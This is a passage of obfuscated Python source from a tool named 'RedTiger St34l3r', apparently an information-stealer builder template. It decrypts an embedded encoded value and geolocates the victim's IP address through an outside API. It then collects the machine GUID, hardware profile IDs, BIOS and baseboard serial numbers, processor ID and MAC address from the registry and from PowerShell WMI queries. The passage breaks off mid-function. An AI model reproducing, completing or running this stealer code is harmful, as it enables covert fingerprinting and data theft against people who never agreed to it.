except: JLHPALQZDHECTHPEWZNEUOITWNGFEZQRQSRCOGIGRVYPAQMNIRRXTNHDJBCVGKRBRTURPQFUSDIRZIIUBUMINWKTZJT = "None"

OKWGVDUAVWFVBFNNJRATVJPRCOJGUJMVBYPXKYRZATSQPFAYEQFOJMPREFDLSJELLQDWXYFRAYTTIJXQMXCSYMP = r"""
XKZLimZw6JAphntF1FeGCEZLtLvi1TAhjFhPCC1CkOPkLIQYr4fyW2qj4pIXfuBU1ufW09naRnjH9xE1cRk9VBUnWeTGrPBl9FYoVsnDtUkNEP2UNbo8GaQ7FsCgLoivgYqVzLTIQBS6N8yrGmABi+EwpVfpszxqi0VdMHRbh9DViARmksafEsS+vuLwwAyaH+LJ1/eIBkmnYIMJu5Hmeg==
"""

EEDBAKAKVCVHRZBZDKPVTZGXAUPYLRUMYMVSJIJGBNEUPQJLJYKFWWNWDGRCJDCXEJTHFCZLIRSXHHCDELNGVZSQLZ            = "qGUHGUEBAzvaxHuXYELCdXwyoMvcVbxFxdnkOlMUHcBBZRLezbfYbiLEWqpWmXKiTehUhhmRYcoinCPkiFbQXdlNGGuvgJLHFlWzuIZbqExbijpuvXESDyabhoZTNEQjWVTCzulzxiHEEJagK"
GROBQMQDDVBJHNAVCHCFQQELBGXNHHSOEICZTUODZGLYRVFAYQYWRPOFINMZYGUDVMQVNCYBJCZBWNNLFUE        = "None"
UIAYERRZOZDNMQQWTYXAWIFVFIAXSDDGZXYMWFTCDAAICHXZUETLRGOQXYEFPTQDJ    = 0xa80505
AQPNSFVGZMENGXJQJHOCHNNVXWUMUBKQNNNAUYQPICCBWGTUHKZUNDPVFKFKA = "RedTiger St34l3r"
PLHREVQMVZQALSBMLRDLDMZOBLLLYMFLCADEMMHFVHKPQZJIKQHHCUAGPSOCDTYOMARLIIYQAUIRPCCNNIDUWKSHCHVSCVVA   = "https://google.com"
XRAHNXGYBACEDPKBVSLFFQTKLNOEVOTNLOMDMMBUDWBWFYPNWKBSLMFQJS    = "RedTiger St34l3r - github.com/loxy0dev/RedTiger-Tools"
CQEVVAYGADQQXJCLAAPVXMTSVSLBCFTJVIPQEFFVPPNMNLLCLQZPZHMZVUTBWJUVEIQACKAZNCSGSAEZERPG   = {"text": XRAHNXGYBACEDPKBVSLFFQTKLNOEVOTNLOMDMMBUDWBWFYPNWKBSLMFQJS, "icon_url": PLHREVQMVZQALSBMLRDLDMZOBLLLYMFLCADEMMHFVHKPQZJIKQHHCUAGPSOCDTYOMARLIIYQAUIRPCCNNIDUWKSHCHVSCVVA}
KLITTPADSKULYHEEVKGSKAKGXMSLOKNLIVSMDWJEFLWFOEAEJRZHFSBHMQHVORIIRGG    = f'`{TABABGYGNEGEGTRMWONKLNRFKAROZGLEJSGWNNUOZZDDOSCZHBZCJIFJYGIPKOFVDVGLIILLYBFLIJWZELK} "{BRMHIEVVSJOCHAPHFRRZHHEOTEYSUZSJDVOCWRYUQZFDKESQORWEOXNGHHZMIYPZOZUSWGKATQWZNXHPFYZQ}"`'
HOZWEYGUQIRHYYIUVGBEWQWNPTKAZXAFCHRLRJYXXPSOYEWDFIQEZUIWUHSQNRHDHEPMFMMPPMVNAUZNQMY    = TVUVQKUHGITWECGYXHUAGRVGAZQCYWWJRFKJMCFHAQKKUDUWSAYQKZGHBMZGQQJYAMNJHUMP(OKWGVDUAVWFVBFNNJRATVJPRCOJGUJMVBYPXKYRZATSQPFAYEQFOJMPREFDLSJELLQDWXYFRAYTTIJXQMXCSYMP, EEDBAKAKVCVHRZBZDKPVTZGXAUPYLRUMYMVSJIJGBNEUPQJLJYKFWWNWDGRCJDCXEJTHFCZLIRSXHHCDELNGVZSQLZ)

BCRDJGREWIQNVLEJETHTIDXOROGOMXIVSDYNTPVLINSWUPLRBNUKGAGWRQPI           = os.getenv("WINDIR", None)
JMZSSCILAPXZISSIWSPQELSGIXPAWXKTNPAAWSGIBFJBGZRTWBZZJTKGILNCGHYPYA       = os.getenv('USERPROFILE', None)
RCNFFRTLAHDBXLSHMVHIICPVPDZXXCQNQTWSFZBASXGSAOKSFLEIYQVCLGDTWJIDRXYZBNT     = os.getenv('LOCALAPPDATA', None)
CSBGXLWEELTWJYMXXHZDWKKYVATTVHAVQFZAYTEHKZGXEYLMJZHOPTMJNMYFR   = os.getenv('APPDATA', None)
ZZHXLMCAIONOTLIQGMIFMMRJZXSPUBIZROWSIAJGTGAYFIPMEGWN = os.getenv('ProgramFiles(x86)', None)
if ZZHXLMCAIONOTLIQGMIFMMRJZXSPUBIZROWSIAJGTGAYFIPMEGWN is None:
    ZZHXLMCAIONOTLIQGMIFMMRJZXSPUBIZROWSIAJGTGAYFIPMEGWN = os.getenv('ProgramFiles', None)

try:
    ZOHPPOKUOHFQVOHZQKDPBKRZYJTJFBTKXDTOAYNMPUHARDHPTEENUWRNAWEDSDUVJOHWUQCOLQZFKPOS = requests.get(f"https://{GROBQMQDDVBJHNAVCHCFQQELBGXNHHSOEICZTUODZGLYRVFAYQYWRPOFINMZYGUDVMQVNCYBJCZBWNNLFUE}/api/ip/ip={BRMHIEVVSJOCHAPHFRRZHHEOTEYSUZSJDVOCWRYUQZFDKESQORWEOXNGHHZMIYPZOZUSWGKATQWZNXHPFYZQ}")
    PXBBSUMZGFSAYMRZHHKLHTLDSSJCAQPXHAMKMILHBZLTWJTWGLBIMLMALDFWJZHFAIPVUIODHKI = ZOHPPOKUOHFQVOHZQKDPBKRZYJTJFBTKXDTOAYNMPUHARDHPTEENUWRNAWEDSDUVJOHWUQCOLQZFKPOS.json()

    NSYKSRGHKEWDLNRKIGYFHEIOECKGEEZXQOHZCLXJDGZAUZIGOAWQFSBSHQVOLLCC = PXBBSUMZGFSAYMRZHHKLHTLDSSJCAQPXHAMKMILHBZLTWJTWGLBIMLMALDFWJZHFAIPVUIODHKI.get('country', "None")
    NSYKSRGHKEWDLNRKIGYFHEIOECKGEEZXQOHZCLXJDGZAUZIGOAWQFSBSHQVOLLCC_code = PXBBSUMZGFSAYMRZHHKLHTLDSSJCAQPXHAMKMILHBZLTWJTWGLBIMLMALDFWJZHFAIPVUIODHKI.get('country_code', "None")
    WEVTETLGPNDJAPAWUTNMRIXIMOZOFPBKUVKNHXJBYFUKZXZQTPJKGBLEAJEHHRTUJPGITYZEZJTPDNWMHHUIZRB = PXBBSUMZGFSAYMRZHHKLHTLDSSJCAQPXHAMKMILHBZLTWJTWGLBIMLMALDFWJZHFAIPVUIODHKI.get('region', "None")
    WEVTETLGPNDJAPAWUTNMRIXIMOZOFPBKUVKNHXJBYFUKZXZQTPJKGBLEAJEHHRTUJPGITYZEZJTPDNWMHHUIZRB_code = PXBBSUMZGFSAYMRZHHKLHTLDSSJCAQPXHAMKMILHBZLTWJTWGLBIMLMALDFWJZHFAIPVUIODHKI.get('region_code', "None")
    FTBBDNNPYDSQPIXKUDAVXTBSAZRXJKVNDTHOVCOQEKFNSNICIIHNMQYEJMCLRFAKMUDJSQHRHHPWAEIMURNGQVLTHNE = PXBBSUMZGFSAYMRZHHKLHTLDSSJCAQPXHAMKMILHBZLTWJTWGLBIMLMALDFWJZHFAIPVUIODHKI.get('zip', "None")
    HJEVFFLXNWIIMREGHHQPCGHSQUTPOPGFMVSKZFVTJVLXQXHVZVHBJQVKSPJBZPQFUORRQTRQ = PXBBSUMZGFSAYMRZHHKLHTLDSSJCAQPXHAMKMILHBZLTWJTWGLBIMLMALDFWJZHFAIPVUIODHKI.get('city', "None")
    DTXIFGHYIKFDOYXWFTFBDHPNTMDJIXIYYQYESCIUUBUEPMRXBLZDSDAGBM = PXBBSUMZGFSAYMRZHHKLHTLDSSJCAQPXHAMKMILHBZLTWJTWGLBIMLMALDFWJZHFAIPVUIODHKI.get('latitude', "None")
    CCFKRTPYTZGTMLAEROZSWNSSPVBGMGHHUWLTFLHYTSXVYWNQMWTQWMZUMFIAYYZ = PXBBSUMZGFSAYMRZHHKLHTLDSSJCAQPXHAMKMILHBZLTWJTWGLBIMLMALDFWJZHFAIPVUIODHKI.get('longitude', "None")
    DJOOECOALQYURJCKBGANRZJLTCJMEVVMFCZMCSLLEROSDHAYRGNZVWRCQUSELHWFCBIVWVGWPDGQUMSRKVLTDHIHBKMIA = PXBBSUMZGFSAYMRZHHKLHTLDSSJCAQPXHAMKMILHBZLTWJTWGLBIMLMALDFWJZHFAIPVUIODHKI.get('timezone', "None")
    OFLFDTOFUATZSRUEAJYULSVZSDUFAYZXBCIPAUNBNYRNFAWYPPPWJVTCHAOSISSLSZCPQWHBLJMMZ = PXBBSUMZGFSAYMRZHHKLHTLDSSJCAQPXHAMKMILHBZLTWJTWGLBIMLMALDFWJZHFAIPVUIODHKI.get('isp', "None")
    VWTZXAWFBEGCFZRYHKKHDZQOHUOHAWLGYDZXAHGWFZDZHFMLTHJXVCHIO = PXBBSUMZGFSAYMRZHHKLHTLDSSJCAQPXHAMKMILHBZLTWJTWGLBIMLMALDFWJZHFAIPVUIODHKI.get('org', "None")
    VEOWAIVGAVWXPZFGMTWKYMQTYWTHPIIFGLOIGRHWDDFSTKTXOFKLHEOLYWS = PXBBSUMZGFSAYMRZHHKLHTLDSSJCAQPXHAMKMILHBZLTWJTWGLBIMLMALDFWJZHFAIPVUIODHKI.get('as', "None")
except:
    ZOHPPOKUOHFQVOHZQKDPBKRZYJTJFBTKXDTOAYNMPUHARDHPTEENUWRNAWEDSDUVJOHWUQCOLQZFKPOS = requests.get(f"http://ip-api.com/json/{BRMHIEVVSJOCHAPHFRRZHHEOTEYSUZSJDVOCWRYUQZFDKESQORWEOXNGHHZMIYPZOZUSWGKATQWZNXHPFYZQ}")
    PXBBSUMZGFSAYMRZHHKLHTLDSSJCAQPXHAMKMILHBZLTWJTWGLBIMLMALDFWJZHFAIPVUIODHKI = ZOHPPOKUOHFQVOHZQKDPBKRZYJTJFBTKXDTOAYNMPUHARDHPTEENUWRNAWEDSDUVJOHWUQCOLQZFKPOS.json()

    NSYKSRGHKEWDLNRKIGYFHEIOECKGEEZXQOHZCLXJDGZAUZIGOAWQFSBSHQVOLLCC = PXBBSUMZGFSAYMRZHHKLHTLDSSJCAQPXHAMKMILHBZLTWJTWGLBIMLMALDFWJZHFAIPVUIODHKI.get('country', "None")
    NSYKSRGHKEWDLNRKIGYFHEIOECKGEEZXQOHZCLXJDGZAUZIGOAWQFSBSHQVOLLCC_code = PXBBSUMZGFSAYMRZHHKLHTLDSSJCAQPXHAMKMILHBZLTWJTWGLBIMLMALDFWJZHFAIPVUIODHKI.get('countryCode', "None")
    WEVTETLGPNDJAPAWUTNMRIXIMOZOFPBKUVKNHXJBYFUKZXZQTPJKGBLEAJEHHRTUJPGITYZEZJTPDNWMHHUIZRB = PXBBSUMZGFSAYMRZHHKLHTLDSSJCAQPXHAMKMILHBZLTWJTWGLBIMLMALDFWJZHFAIPVUIODHKI.get('regionName', "None")
    WEVTETLGPNDJAPAWUTNMRIXIMOZOFPBKUVKNHXJBYFUKZXZQTPJKGBLEAJEHHRTUJPGITYZEZJTPDNWMHHUIZRB_code = PXBBSUMZGFSAYMRZHHKLHTLDSSJCAQPXHAMKMILHBZLTWJTWGLBIMLMALDFWJZHFAIPVUIODHKI.get('region', "None")
    FTBBDNNPYDSQPIXKUDAVXTBSAZRXJKVNDTHOVCOQEKFNSNICIIHNMQYEJMCLRFAKMUDJSQHRHHPWAEIMURNGQVLTHNE = PXBBSUMZGFSAYMRZHHKLHTLDSSJCAQPXHAMKMILHBZLTWJTWGLBIMLMALDFWJZHFAIPVUIODHKI.get('zip', "None")
    HJEVFFLXNWIIMREGHHQPCGHSQUTPOPGFMVSKZFVTJVLXQXHVZVHBJQVKSPJBZPQFUORRQTRQ = PXBBSUMZGFSAYMRZHHKLHTLDSSJCAQPXHAMKMILHBZLTWJTWGLBIMLMALDFWJZHFAIPVUIODHKI.get('city', "None")
    DTXIFGHYIKFDOYXWFTFBDHPNTMDJIXIYYQYESCIUUBUEPMRXBLZDSDAGBM = PXBBSUMZGFSAYMRZHHKLHTLDSSJCAQPXHAMKMILHBZLTWJTWGLBIMLMALDFWJZHFAIPVUIODHKI.get('lat', "None")
    CCFKRTPYTZGTMLAEROZSWNSSPVBGMGHHUWLTFLHYTSXVYWNQMWTQWMZUMFIAYYZ = PXBBSUMZGFSAYMRZHHKLHTLDSSJCAQPXHAMKMILHBZLTWJTWGLBIMLMALDFWJZHFAIPVUIODHKI.get('lon', "None")
    DJOOECOALQYURJCKBGANRZJLTCJMEVVMFCZMCSLLEROSDHAYRGNZVWRCQUSELHWFCBIVWVGWPDGQUMSRKVLTDHIHBKMIA = PXBBSUMZGFSAYMRZHHKLHTLDSSJCAQPXHAMKMILHBZLTWJTWGLBIMLMALDFWJZHFAIPVUIODHKI.get('timezone', "None")
    OFLFDTOFUATZSRUEAJYULSVZSDUFAYZXBCIPAUNBNYRNFAWYPPPWJVTCHAOSISSLSZCPQWHBLJMMZ = PXBBSUMZGFSAYMRZHHKLHTLDSSJCAQPXHAMKMILHBZLTWJTWGLBIMLMALDFWJZHFAIPVUIODHKI.get('isp', "None")
    VWTZXAWFBEGCFZRYHKKHDZQOHUOHAWLGYDZXAHGWFZDZHFMLTHJXVCHIO = PXBBSUMZGFSAYMRZHHKLHTLDSSJCAQPXHAMKMILHBZLTWJTWGLBIMLMALDFWJZHFAIPVUIODHKI.get('org', "None")
    VEOWAIVGAVWXPZFGMTWKYMQTYWTHPIIFGLOIGRHWDDFSTKTXOFKLHEOLYWS = PXBBSUMZGFSAYMRZHHKLHTLDSSJCAQPXHAMKMILHBZLTWJTWGLBIMLMALDFWJZHFAIPVUIODHKI.get('as', "None")

def KASNLIRKRZSSFSXUSAXIRFVUYGKTREMIKIJDEFGHPOBQXQSLACUJCEEFECBVDJTJKOC(TNGFVIMTFECFIRXADBETKMGKCNEPMHUTVLYJJZSKQYMIJLZFQIKOEAAVCXUVNYYHJXHMJXTSG):
    import platform
    import subprocess
    import uuid
    import psutil
    import GPUtil
    import ctypes
    import win32api
    import string
    import screeninfo
    import winreg

    try: YQEUOFTBOBBWGFZXQBLKCJUIRAOZNPNPOENCBKGXCNYIPFSEXKOPMVP = platform.system()
    except: YQEUOFTBOBBWGFZXQBLKCJUIRAOZNPNPOENCBKGXCNYIPFSEXKOPMVP = "None"

    try: FHZXVVJSOPWHKJPNRIOAYRAJUHZVAKCNTCUHPVUZZFWODXKUMOSHTYUBXALUWVOOMMMMFWGMPDFVPJWQURC = platform.version()
    except: FHZXVVJSOPWHKJPNRIOAYRAJUHZVAKCNTCUHPVUZZFWODXKUMOSHTYUBXALUWVOOMMMMFWGMPDFVPJWQURC = "None"

    try: ELMZFKSWRSBHILBYEMBDJNYZVIRBWDPTEJMUBSVWINKBHMSFUAWMQVJVYHQSYLX = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,2*6,2)][::-1])
    except: ELMZFKSWRSBHILBYEMBDJNYZVIRBWDPTEJMUBSVWINKBHMSFUAWMQVJVYHQSYLX = "None"

    try: YOKEYUAXIEYYLJZIECZPKNRNLJOXECMSPHCASLJGESTXGZYTMOPWHUVHCHXAWUQY = str(round(psutil.virtual_memory().total / (1024**3), 2)) + "Go"
    except: YOKEYUAXIEYYLJZIECZPKNRNLJOXECMSPHCASLJGESTXGZYTMOPWHUVHCHXAWUQY = "None"

    try: DGPOFDQJIUYSCJDQDMCLTBSNJEGWOAVIDIDVEBOHZQRTESQPAIUKBB = platform.processor()
    except: DGPOFDQJIUYSCJDQDMCLTBSNJEGWOAVIDIDVEBOHZQRTESQPAIUKBB = "None"

    try: MCSCUDJMPSPVSIOODLZCEIGKRRAKJUVKKQUCOUPSEJSCQPPNGSLDXUCRFKYRSPVZCMAHPYUNEMNQSBWZUYVLSBSKBPWWZX = str(psutil.cpu_count(logical=False)) + " Core"
    except: MCSCUDJMPSPVSIOODLZCEIGKRRAKJUVKKQUCOUPSEJSCQPPNGSLDXUCRFKYRSPVZCMAHPYUNEMNQSBWZUYVLSBSKBPWWZX = "None"

    try: UDQXXXGEOKHDRPEZVDZTTLGWQZLHKRECYQCSIPWYMFYXZNZYZKXSPPAPTOFPGDLYWTDYROTGVJVJBBXWZGLRWIDDLI = GPUtil.getGPUs()[0].name if GPUtil.getGPUs() else "None"
    except: UDQXXXGEOKHDRPEZVDZTTLGWQZLHKRECYQCSIPWYMFYXZNZYZKXSPPAPTOFPGDLYWTDYROTGVJVJBBXWZGLRWIDDLI = "None"

    WJBWYPEYWHMJEZKWICRKTIGQPFRTIISPJEVMJAANKGQLXEYYZTUDJKZDWZBETLELGKLYGTXNZFHPSYUDOPAARRHZYJTWCBZNKKTC                 = r"SOFTWARE\Microsoft\Cryptography"
    ISXNZHOSVOIZSREOQKTYPRNEGJKJSYHYUPTGEVMHCHGDZGCGJBHUDIMRRSFPVJVYHR                    = r"SOFTWARE\Microsoft\SQMClient"
    IFKJDYYEDEXENOVBUYTVTYETMLQJLALODYFICJWPQXMQFIQXAOLDFXYKNMJRQ             = r"SYSTEM\CurrentControlSet\Control\IDConfigDB\Hardware Profiles\0001"
    KAJNUFGKCUUKVQKIFITGECKPYDFASNRRFAMFORNUPMFOLONIBTONTKHRPCFSFHIYRZRICFXXHXHIRVGMTAZPKVQESBN                       = r'SOFTWARE\NVIDIA Corporation'
    VPOCFVNISIYWXJRDSGVJTZOFICFUJHZRSMJTESQZGSHZUOSBPFONU               = r'SYSTEM\HardwareConfig\Current'

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, WJBWYPEYWHMJEZKWICRKTIGQPFRTIISPJEVMJAANKGQLXEYYZTUDJKZDWZBETLELGKLYGTXNZFHPSYUDOPAARRHZYJTWCBZNKKTC, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "MachineGuid")
            OKHDZNLVFLCPGPGLIQHJLHJAVZSJVCJOJRCVKBWPDFWGVOLIOYCTTKHRXTTQUCNNMAAZTDQDSRTFZNIPKWLVFZCWEGBTVBZCA = str(v4r_value).replace("{", "").replace("}", "")
    except: OKHDZNLVFLCPGPGLIQHJLHJAVZSJVCJOJRCVKBWPDFWGVOLIOYCTTKHRXTTQUCNNMAAZTDQDSRTFZNIPKWLVFZCWEGBTVBZCA = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, IFKJDYYEDEXENOVBUYTVTYETMLQJLALODYFICJWPQXMQFIQXAOLDFXYKNMJRQ, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "GUID")
            QQAQCQRTJOKHMRPFSINYCZNSXUSLTAPHSEFPDTEHEUFQBCKHITJYNEIBYRJCOPNCEJTDSCZHTIHUHTZXIMSCRPYJP = str(v4r_value).replace("{", "").replace("}", "")
    except: QQAQCQRTJOKHMRPFSINYCZNSXUSLTAPHSEFPDTEHEUFQBCKHITJYNEIBYRJCOPNCEJTDSCZHTIHUHTZXIMSCRPYJP = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, IFKJDYYEDEXENOVBUYTVTYETMLQJLALODYFICJWPQXMQFIQXAOLDFXYKNMJRQ, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "HwProfileGuid")
            EFOVPQJHRHNWTPVOITCOILLXIBWTNJTULGNZXMYJJJXKMRGGQIJGJVLOKRWQTBSVEAWGITFAPEEJLLZJURCOFWCEJPK = str(v4r_value).replace("{", "").replace("}", "")
    except: EFOVPQJHRHNWTPVOITCOILLXIBWTNJTULGNZXMYJJJXKMRGGQIJGJVLOKRWQTBSVEAWGITFAPEEJLLZJURCOFWCEJPK = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, ISXNZHOSVOIZSREOQKTYPRNEGJKJSYHYUPTGEVMHCHGDZGCGJBHUDIMRRSFPVJVYHR, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "MachineId")
            VMFLTYTWIQQNZSVBPCRMMUHLOOVOKDFXTEDNKIJGVMMDQQVRWFZPWQOLRWRQRJWVNDZDCOUAPCAGX = str(v4r_value).replace("{", "").replace("}", "")
    except: VMFLTYTWIQQNZSVBPCRMMUHLOOVOKDFXTEDNKIJGVMMDQQVRWFZPWQOLRWRQRJWVNDZDCOUAPCAGX = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, KAJNUFGKCUUKVQKIFITGECKPYDFASNRRFAMFORNUPMFOLONIBTONTKHRPCFSFHIYRZRICFXXHXHIRVGMTAZPKVQESBN+r'\Installer2', 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "SystemID")
            AJGDNVGXXOTGMIYTJJIAMWRJNOIZWYOXLSRQALDHDZIOFTQULCOVAUUWKUL = str(v4r_value).replace("{", "").replace("}", "")
    except: AJGDNVGXXOTGMIYTJJIAMWRJNOIZWYOXLSRQALDHDZIOFTQULCOVAUUWKUL = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, VPOCFVNISIYWXJRDSGVJTZOFICFUJHZRSMJTESQZGSHZUOSBPFONU, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "BaseBoardProduct")
            RXCLRWXVXXJGPRBPBUYMMQDIEGUCJSJQWWJXLNAERGXIVYWBYKETPOOBGRNJDPATCNL = str(v4r_value).replace("{", "").replace("}", "")
    except: RXCLRWXVXXJGPRBPBUYMMQDIEGUCJSJQWWJXLNAERGXIVYWBYKETPOOBGRNJDPATCNL = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, VPOCFVNISIYWXJRDSGVJTZOFICFUJHZRSMJTESQZGSHZUOSBPFONU, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "BaseBoardManufacturer")
            FVNVMLFQVDNWUSRYOFKQORWSNLKMAHOJQBHXHCNHGLCMYCVKNZURVVUXOEXFXAXFKTKSRBFVQ = str(v4r_value).replace("{", "").replace("}", "")
    except: FVNVMLFQVDNWUSRYOFKQORWSNLKMAHOJQBHXHCNHGLCMYCVKNZURVVUXOEXFXAXFKTKSRBFVQ = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, VPOCFVNISIYWXJRDSGVJTZOFICFUJHZRSMJTESQZGSHZUOSBPFONU, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "BIOSReleaseDate")
            FJHJAWJNUWQIQUQRBLSLEXZNOUJNEDLRXPJUWMMINPPFLJHPUNRREPWFOYXF = str(v4r_value).replace("{", "").replace("}", "")
    except: FJHJAWJNUWQIQUQRBLSLEXZNOUJNEDLRXPJUWMMINPPFLJHPUNRREPWFOYXF = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, VPOCFVNISIYWXJRDSGVJTZOFICFUJHZRSMJTESQZGSHZUOSBPFONU, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "BIOSVersion")
            TVUGCAQBHLUWWNXDEULSPAWLQHGIXCMKSXEAOMUVDIAUQQJIHHKFTAXJ = str(v4r_value).replace("{", "").replace("}", "")
    except: TVUGCAQBHLUWWNXDEULSPAWLQHGIXCMKSXEAOMUVDIAUQQJIHHKFTAXJ = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, VPOCFVNISIYWXJRDSGVJTZOFICFUJHZRSMJTESQZGSHZUOSBPFONU, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "SystemBiosVersion")
            MBLSCFOLJVOSQFTHGBRQKOPBPZVUTNWMQETSJLQRJRZQZXKPSIFYWDCWOWBESTXAHHIMQHEDJIBMGYXIQJKI = str(v4r_value).replace("{", "").replace("}", "")
    except: MBLSCFOLJVOSQFTHGBRQKOPBPZVUTNWMQETSJLQRJRZQZXKPSIFYWDCWOWBESTXAHHIMQHEDJIBMGYXIQJKI = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, VPOCFVNISIYWXJRDSGVJTZOFICFUJHZRSMJTESQZGSHZUOSBPFONU, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "SystemVersion")
            PLSJYXKGDVDTUWLDTIXSWXPFRFYSHCZUCBEWJVCUDQZKOYCLWEASBXANDWLMZBWXFSKOQZSOVMMKXXKWHOCUUYJEY = str(v4r_value).replace("{", "").replace("}", "")
    except: PLSJYXKGDVDTUWLDTIXSWXPFRFYSHCZUCBEWJVCUDQZKOYCLWEASBXANDWLMZBWXFSKOQZSOVMMKXXKWHOCUUYJEY = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, VPOCFVNISIYWXJRDSGVJTZOFICFUJHZRSMJTESQZGSHZUOSBPFONU, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "SystemFamily")
            QXKXWMKTKZOZEEEEKOGVCIUBDQOQKCNSQMAWNZMIJXMYGGGILWSEMUVBHAKVAHGFHAEMJAQXIB = str(v4r_value).replace("{", "").replace("}", "")
    except: QXKXWMKTKZOZEEEEKOGVCIUBDQOQKCNSQMAWNZMIJXMYGGGILWSEMUVBHAKVAHGFHAEMJAQXIB = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, VPOCFVNISIYWXJRDSGVJTZOFICFUJHZRSMJTESQZGSHZUOSBPFONU, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "SystemManufacturer")
            WYTVRRATVKSNPKWCOSTUQLKLMAYUZQIKNNSBSUMZXFVKPJKMSMZOWTWBEPHNTDOMDUNGCREJCLCOYS = str(v4r_value).replace("{", "").replace("}", "")
    except: WYTVRRATVKSNPKWCOSTUQLKLMAYUZQIKNNSBSUMZXFVKPJKMSMZOWTWBEPHNTDOMDUNGCREJCLCOYS = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, VPOCFVNISIYWXJRDSGVJTZOFICFUJHZRSMJTESQZGSHZUOSBPFONU, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "SystemProductName")
            DXGSTTCDNFHXIRTTNDGAZGDBFGVHNAKZTHCYGHPUPHMHRHLALTHIBWWFZQWQD = str(v4r_value).replace("{", "").replace("}", "")
    except: DXGSTTCDNFHXIRTTNDGAZGDBFGVHNAKZTHCYGHPUPHMHRHLALTHIBWWFZQWQD = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, VPOCFVNISIYWXJRDSGVJTZOFICFUJHZRSMJTESQZGSHZUOSBPFONU, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "SystemSKU")
            MDRQMKQSDEYVSGLYHHFOVROVMZNVZIQHREDLYACBLFHAYMAMPPWKIMSHXKXRAUEBHZSVW = str(v4r_value).replace("{", "").replace("}", "")
    except: MDRQMKQSDEYVSGLYHHFOVROVMZNVZIQHREDLYACBLFHAYMAMPPWKIMSHXKXRAUEBHZSVW = None

    def RunPowershell(query):
        try:
            result = subprocess.check_output(
                ['powershell', '-Command', query],
                stderr=subprocess.STDOUT,
                text=True
            ).split('\n')[0].strip()
            return result if result else None
        except:
            return None

    try: ROEFYFVNECNRWVPORSWWDBMLTYAMYVZMRHKWSAJULOISMJMYKVSDJNOQPNVYRDSKRYZOBTKCIGGUEBJVGHJ = RunPowershell("(Get-WmiObject -Class Win32_ComputerSystemProduct).UUID")
    except: ROEFYFVNECNRWVPORSWWDBMLTYAMYVZMRHKWSAJULOISMJMYKVSDJNOQPNVYRDSKRYZOBTKCIGGUEBJVGHJ = None

    try: KFILEYYJNNNCRVGPMQGOVLNEOMDNEXEEZOVKDRPHFOYQUASOYQGKRSVMUUP = RunPowershell("(Get-WmiObject -Class Win32_BIOS).SerialNumber")
    except: KFILEYYJNNNCRVGPMQGOVLNEOMDNEXEEZOVKDRPHFOYQUASOYQGKRSVMUUP = None

    try: KOHXGZCBUUHRHBPZWZJTJQUSRXNRABYSCHCOPCQTCEHOLMGSNGYQMZSHQJJATAWMJDYBQUNLHVJFLKUMLTXGXNKSXPDNZ = RunPowershell("(Get-WmiObject -Class Win32_BaseBoard).SerialNumber")
    except: KOHXGZCBUUHRHBPZWZJTJQUSRXNRABYSCHCOPCQTCEHOLMGSNGYQMZSHQJJATAWMJDYBQUNLHVJFLKUMLTXGXNKSXPDNZ = None

    try: TTGWVTAVCYYRYJOJXFBSEJOBMKFMBQJFBDPUYZOPILILNBNGNBWFZ = RunPowershell("(Get-WmiObject -Class Win32_Processor).ProcessorId")
    except: TTGWVTAVCYYRYJOJXFBSEJOBMKFMBQJFBDPUYZOPILILNBNGNBWFZ = None

    try: HTAGTEDLOFZARLUCHMGVPUWYLEBWUUBFBJQCPLAQHKQBAWGRKGWP = RunPowershell("(Get-WmiObject -Class Win32_BIOS).OEMStringArray")
    except: HTAGTEDLOFZARLUCHMGVPUWYLEBWUUBFBJQCPLAQHKQBAWGRKGWP = None

    try: VFDFEOGDYDVWDSAQAPVBFSVTISFAJYHTZLGKOCBTAUWZSEGBEUIXRHMEPY = RunPowershell("(Get-WmiObject -Class Win32_SystemEnclosure).SMBIOSAssetTag")
    except: VFDFEOGDYDVWDSAQAPVBFSVTISFAJYHTZLGKOCBTAUWZSEGBEUIXRHMEPY = None
        
    try:
